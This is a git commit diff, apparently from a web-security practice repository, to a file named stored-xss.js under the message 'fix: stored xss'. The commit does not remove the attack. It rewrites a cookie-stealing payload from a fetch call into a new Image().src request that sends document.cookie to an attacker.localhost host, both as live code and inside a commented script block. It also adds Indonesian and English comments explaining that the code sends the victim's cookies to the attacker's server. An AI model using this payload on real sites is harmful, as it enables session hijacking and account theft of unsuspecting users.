229f53016ed8e4b5074bc5f7588fc4522e38fbbe
fuureya <agiljibrin009@gmail.com>
2025-08-25 15:44:48 +0800

    fix: stored xss

--- xss/stored-xss.js
+++ xss/stored-xss.js
@@ -1,13 +1,12 @@
-fetch(
-  "http://attacker.localhost:3000/cookies/" +
-    encodeURIComponent(document.cookie)
-).catch(() => {});
+new Image().src =
+  "https://attacker.localhost/cookies/" + encodeURIComponent(document.cookie);
 /* 
 hello bro
 <script>
-  fetch("http://attacker.localhost:3000/cookies/" + encodeURIComponent(document.cookie))
-    .catch(() => {});
+  new Image().src =
+  "https://attacker.localhost/cookies/" + encodeURIComponent(document.cookie);
 </script>
 
-
+Inonesia : Kode ini mengirim cookie korban ke server attacker menggunakan JavaScript tanpa menampilkan gambar:
+English : This code sends the victim’s cookies to the attacker’s server using JavaScript without showing any image:
 */
